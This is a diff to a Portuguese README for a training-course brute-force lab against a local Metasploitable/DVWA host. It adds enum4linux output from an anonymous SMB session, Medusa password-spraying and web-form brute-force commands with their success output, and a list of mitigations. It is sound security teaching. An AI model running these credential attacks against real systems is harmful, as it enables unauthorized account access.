@@ -83,6 +83,17 @@ admin
 toor
 
 
+**usuarios_enumerados.txt** (gerada a partir da enumeração SMB)
+
+msfadmin
+root
+user
+postgres
+mysql
+ftp
+backup
+
+
 ### 1. Força Bruta em FTP
 
 Comando utilizado:
@@ -102,46 +113,92 @@ O Medusa identificou a credencial válida logo na primeira combinação testada 
 
 ### 2. Password Spraying em SMB com enumeração de usuários
 
-Enumeração de usuários:
+Enumeração de usuários (sessão nula/anônima):
 ```bash
 enum4linux -U 192.168.122.226
 ```
 
-Password spraying:
+[+] Server 192.168.122.226 allows sessions using username ‘’, password ‘’
+...
+user:[msfadmin] rid:[0xbb8]
+user:[root] rid:[0x3e8]
+user:[postgres] rid:[0x4c0]
+user:[mysql] rid:[0x4c2]
+user:[ftp] rid:[0x4be]
+user:[backup] rid:[0x42c]
+(34 usuários enumerados no total)
+
+
+O servidor permitiu sessão SMB anônima (usuário/senha vazios), possibilitando a enumeração de 34 contas reais do sistema sem qualquer autenticação — uma falha crítica de configuração.
+
+Password spraying (uma senha testada contra vários usuários enumerados):
 ```bash
-medusa -h 192.168.122.226 -U wordlists/usuarios.txt -p msfadmin -M smbnt
+medusa -h 192.168.122.226 -U wordlists/usuarios_enumerados.txt -p msfadmin -M smbnt
 ```
 
-**Resultado:**
-> _(pendente — rodar os comandos acima e colar aqui)_
+2026-10-27 02:49:48 ACCOUNT FOUND: [smbnt] Host: 192.168.122.226 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
+
+
+**Resultado:** de 7 usuários testados com a senha `msfadmin`, apenas a conta `msfadmin` foi validada — porém com **acesso administrativo completo** (`ADMIN$`), evidenciando o risco de uma conta privilegiada usando senha igual ao nome de usuário.
 
 ### 3. Automação de tentativas em formulário Web (DVWA)
 
 - DVWA configurado com nível de segurança **Low**, para fins didáticos.
-- Módulo de login acessado em `http://192.168.122.226/dvwa/login.php`.
+- Módulo de login acessado em `http://192.168.122.226/dvwa/vulnerabilities/brute/`.
+- Formulário utiliza método **GET**, enviando `username`, `password` e `Login` diretamente na URL.
+- Autenticação depende de sessão ativa (cookie `PHPSESSID`), capturado via DevTools do navegador.
 
-Comando/método utilizado:
+Comando utilizado:
 ```bash
-# (pendente — comando do Medusa com módulo web-form, ou configuração usada no Burp Intruder)
+medusa -h 192.168.122.226 -u admin -P wordlists/senhas.txt -M web-form \
+-m FORM:"/dvwa/vulnerabilities/brute/index.php" \
+-m FORM-DATA:"get?username=&password=&Login=Login" \
+-m DENY-SIGNAL:"Username and/or password incorrect" \
+-m CUSTOM-HEADER:"Cookie: security=low; PHPSESSID=7d7cb67a1449c0dce513df7180e2bce9"
 ```
 
 **Resultado:**
-> _(pendente — rodar o ataque e colar aqui)_
+
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks jmk@foofus.net
+
+2026-10-27 02:57:28 ACCOUNT CHECK: [web-form] Host: 192.168.122.226 User: admin Password: msfadmin
+2026-10-27 02:57:28 ACCOUNT CHECK: [web-form] Host: 192.168.122.226 User: admin Password: 123456
+2026-10-27 02:57:28 ACCOUNT CHECK: [web-form] Host: 192.168.122.226 User: admin Password: password
+2026-10-27 02:57:28 ACCOUNT FOUND: [web-form] Host: 192.168.122.226 User: admin Password: password [SUCCESS]
+
+
+A credencial `admin:password` — padrão de instalação do próprio DVWA — foi validada já na terceira tentativa, evidenciando o risco de manter credenciais padrão em aplicações web expostas, especialmente combinadas com ausência de rate limiting, bloqueio de conta e CAPTCHA.
 
 ---
 
 ## 🛡️ Medidas de Prevenção e Mitigação
 
-1. **Políticas de Senhas Fortes:** eliminar credenciais padrão (como `msfadmin:msfadmin`) e exigir comprimento mínimo (12+ caracteres) com diversidade de tipos de caractere.
+1. **Políticas de Senhas Fortes:** eliminar credenciais padrão (como `msfadmin:msfadmin` e `admin:password`) e exigir comprimento mínimo (12+ caracteres) com diversidade de tipos de caractere.
 2. **Bloqueio de Conta (*Account Lockout*):** bloquear temporariamente a conta após um número limite de tentativas incorretas consecutivas.
 3. **Limitação de Taxa (*Rate Limiting*):** restringir requisições por IP em um intervalo de tempo.
 4. **Autenticação Multifator (MFA/2FA):** exigir um segundo fator além da senha.
 5. **CAPTCHA:** em formulários web, para impedir automação por scripts e bots.
 6. **Monitoramento e Detecção:** uso de Fail2ban ou SIEM para analisar logs (ex.: `/var/log/auth.log`) e bloquear IPs suspeitos automaticamente.
 7. **Firewalls e IDS/IPS:** restringir acesso a portas sensíveis (SSH, FTP, SMB) apenas a redes confiáveis.
+8. **Desabilitar Sessões Anônimas em SMB:** impedir enumeração de usuários e compartilhamentos sem autenticação (`restrict anonymous` no Samba).
 
 ---
 
 ## 📚 Conclusão
 
-O desafio permitiu compreender na prática como funcionam ataques de automação de credenciais contra diferentes serviços (FTP, SMB, aplicações web), reforçando a importância de múltiplas camadas de defesa (*Defense in Depth*) para proteger sistemas corporativos.
+Este desafio permitiu compreender, na prática, como funcionam ataques de automação de credenciais contra diferentes serviços — FTP, SMB e uma aplicação web (DVWA). Em todos os três cenários, o fator comum que permitiu o sucesso dos ataques foi o uso de **credenciais padrão/fracas** e a **ausência de mecanismos de defesa** como bloqueio de conta, rate limiting e MFA.
+
+O laboratório reforça a importância de implementar múltiplas camadas de defesa (*Defense in Depth*), já que nenhuma medida isolada é suficiente: senhas fortes reduzem o sucesso de ataques de dicionário, mas não impedem automação sem rate limiting; MFA protege mesmo quando a senha é comprometida; e a desativação de sessões/serviços desnecessários reduz a superfície de ataque disponível para enumeração.
+
+---
+
+## 📁 Estrutura do Repositório
+
+```
+desafio-brute-force-dio/
+├── README.md
+├── foto.png
+└── wordlists/
+    ├── usuarios.txt
+    ├── senhas.txt
+    └── usuarios_enumerados.txt
